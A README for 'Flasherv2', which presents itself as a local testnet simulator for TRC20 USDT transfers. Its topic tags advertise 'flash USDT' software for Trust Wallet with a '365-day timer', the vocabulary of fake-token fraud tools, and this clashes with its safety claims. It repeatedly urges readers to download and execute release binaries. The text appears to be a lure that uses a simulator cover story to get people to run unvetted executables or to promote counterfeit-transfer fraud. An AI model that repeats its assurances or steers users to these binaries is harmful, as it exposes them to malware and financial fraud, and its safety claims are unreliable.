# Flasherv2 — USDT Sender Simulator for TRC20 Wallets Tool

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/ComeToMe99/flasherv2/releases)

🚀 Flasherv2 provides a safe, local simulator for TRC20 USDT transactions. Use it for development, QA, and regression tests with testnet tokens and simulated wallets.

Badges
- Topics: `flash-usdt-software-for-trust-wallet` `flash-usdt-software-with-365-day-timer` `flashbtcsender` `flashusdtgenerator` `usdt` `usdt-flash-software-2025-trc20` `usdt-flasher-tool-for-wallet-simulation` `usdt-flasher-with-auto-hash-logging`

Screenshots
- Main UI (simulated):  
  ![Wallet Simulation](https://images.unsplash.com/photo-1549421263-3f86e0a6d7df?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=60)
- Transaction log example:  
  ![Logs](https://images.unsplash.com/photo-1518770660439-4636190af475?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=60)

Overview
- Flasherv2 simulates TRC20 USDT send operations for development, testing, and classroom use.
- It connects to a configurable TRON testnet RPC, uses mock wallets, and logs hashes and events for traceability.
- The simulator does not create or transfer real value. Work with testnet tokens only.

Key features
- TRC20 transaction simulator (ABI-level).  
- Mock wallet generation and import.  
- Batch send simulation with configurable timers (365-day timer simulation supported for testing long-run behavior).  
- Auto hash logging to local structured logs (JSON, CSV).  
- CLI and minimal GUI modes.  
- Pluggable RPC target (mainnet/testnet/sandbox).  
- Extensible hooks for integration tests.

Why use Flasherv2
- Validate wallet flows without risking funds.  
- Reproduce time-based behaviors (timers, expiries).  
- Capture and inspect transaction payloads, ABI calls, and simulated tx hashes.  
- Automate QA scenarios for wallets and dApps that handle TRC20 USDT.

License
- MIT — see LICENSE file in repo.

Install and run (releases)
- Download and execute the release file from the Releases page: https://github.com/ComeToMe99/flasherv2/releases.  
  - The releases page contains packaged builds for supported platforms (Windows, macOS, Linux).  
  - Pick the build that matches your OS, download it, and run the executable in a controlled environment.

Quick setup (local dev)
1. Clone the repo:
   - git clone https://github.com/ComeToMe99/flasherv2.git
2. Install dependencies:
   - Node: v16+ or Python: 3.9+ depending on chosen backend (repo includes both JS and Py adapters).  
   - npm install or pip install -r requirements.txt
3. Configure:
   - Copy config.example.json -> config.json.  
   - Set rpc.url to a TRON testnet RPC (e.g., Tron Shasta or a local mock RPC).  
   - Set mode to "simulator" to prevent outbound mainnet calls.
4. Start:
   - npm run start or python run_simulator.py
5. Using the release binary
   - If you prefer a packaged build, download it from https://github.com/ComeToMe99/flasherv2/releases and run the binary. The release builds include a bundled runtime and a default config file.

Security and safety (design constraints)
- Flasherv2 uses a strict sandbox mode by default.  
- It targets testnets only. Do not point the tool at mainnet RPCs with real keys.  
- The tool logs simulated tx hashes and payloads for debugging. Keep logs in a secure location for privacy.  
- The tool supports hardware wallet mocks for test flows; it never performs real key signing unless you explicitly configure a signer that uses a real key (not recommended).

Configuration reference
- config.json fields:
  - rpc.url: string — RPC endpoint (e.g., https://api.shasta.trongrid.io)  
  - token.contract: string — TRC20 token contract address (testnet token)  
  - wallet.seed: string — deterministic seed for mock wallets  
  - mode: string — simulator | integration | dry-run  
  - batch.size: int — number of sends per batch  
  - timer.days: int — simulation days (e.g., 365) to test long-run behaviors  
  - log.format: string — json | csv | text  
  - output.dir: string — logs and artifacts location

CLI examples
- Generate 10 mock wallets:
  - flasherv2 gen-wallets --count 10 --seed "dev-seed"
- Run a batch simulation:
  - flasherv2 send --batch 5 --token 0xTESTTOKEN --mode simulator
- Export logs as JSON:
  - flasherv2 export-logs --format json --out ./logs
(See the full CLI docs in docs/CLI.md)

GUI mode
- A minimal Electron UI offers:
  - Wallet list and import/export.  
  - Batch send wizard.  
  - Real-time log viewer with filters (hash, wallet, status).  
- Start GUI:
  - npm run gui
- GUI runs off the same config.json and respects the mode setting.

Testing and CI
- Unit tests: run npm test or pytest.  
- Integration tests use a mock RPC server (included in test/mocks).  
- CI pipeline runs static analysis and unit tests only. It does not deploy or run any signed transactions to mainnet.

Logging and artifacts
- Log rotation: logs rotate daily and compress older files.  
- Auto hash logging: every simulated transaction yields a synthetic tx hash and full payload. The logger stores:
  - timestamp, batch id, from, to, amount, fee, simulatedHash, rawPayload, status.
- Use the "export-logs" command to produce CSV or JSON reports for audits.

Extensibility
- Add a new provider:
  - Implement the Provider interface (IProvider) in providers/  
  - The interface requires: send(payload), estimateGas(payload), getReceipt(simHash)  
- Hook system:
  - Pre-send and post-send hooks let you attach custom checks or metrics.  
  - Hooks receive the full payload and must return a hook result.

Common scenarios
- Wallet onboarding tests:
  - Generate a pool of mock wallets, perform simulated token distribution, confirm balance changes in logs.
- Long-run expiry tests:
  - Use timer.days = 365 to simulate yearly timers and inspect expiry behaviors.
- Load tests:
  - Use batch.size and parallelism to simulate heavy send scenarios and monitor memory and log throughput.

Troubleshooting
- RPC failures:
  - Confirm rpc.url points to a reachable testnet endpoint.  
  - Check network access and proxy settings in the config.
- Wallet import errors:
  - Supported formats: mnemonic, private key (test only). Use valid testnet keys.
- Unexpected mainnet calls:
  - Verify mode = "simulator" in config.json. If you see outbound real RPC calls, stop immediately and check settings.

FAQ
- Q: Can I test with real USDT?  
  - A: No. The tool targets testnets. Use test tokens to avoid loss and legal exposure.
- Q: Does Flasherv2 sign transactions with real keys?  
  - A: Only if you explicitly configure a real signer. Default behavior uses mock signing for test flows.
- Q: Where do I download releases?  
  - A: Releases are available on the Releases page: https://github.com/ComeToMe99/flasherv2/releases. Choose the appropriate build and run it locally.

Contributing
- Follow these steps:
  1. Fork the repo.  
  2. Create a feature branch.  
  3. Write tests for your change.  
  4. Submit a pull request with a clear description and test results.
- Coding standards:
  - Follow the repo lint rules (eslint or flake8).  
  - Write clear commit messages. Use present-tense verbs.

Changelog
- v2.0 — Major refactor: split provider layer, add timer simulation, GUI.  
- v1.x — Initial simulator features: mock wallets, batch sends, log exports.

References and links
- TRC20 standard: https://developers.tron.network/docs/trc20-token  
- TRON testnets: check official docs for Shasta and Nile RPC endpoints.  
- Releases page (download executables and packaged builds): https://github.com/ComeToMe99/flasherv2/releases

Developer notes
- Use the included mock RPC for deterministic tests.  
- Keep real keys out of test artifacts. The repository contains examples only.

Legal and ethical use
- Use this tool for development, testing, and education only. Do not use it to impersonate or defraud wallets, services, or users. The project targets non-value test environments.

Contact
- File issues on GitHub. Use the issue template to include logs and config files (strip secrets).

Credits
- Built by contributors aiming to provide a controlled environment for TRC20 testing and QA.

License
- MIT

Contributors
- See CONTRIBUTORS.md for details and contributor guidelines.

Release downloads and execution reminder
- Download the packaged build and execute it from the Releases page here: https://github.com/ComeToMe99/flasherv2/releases. Run releases only in a controlled environment and with testnet settings.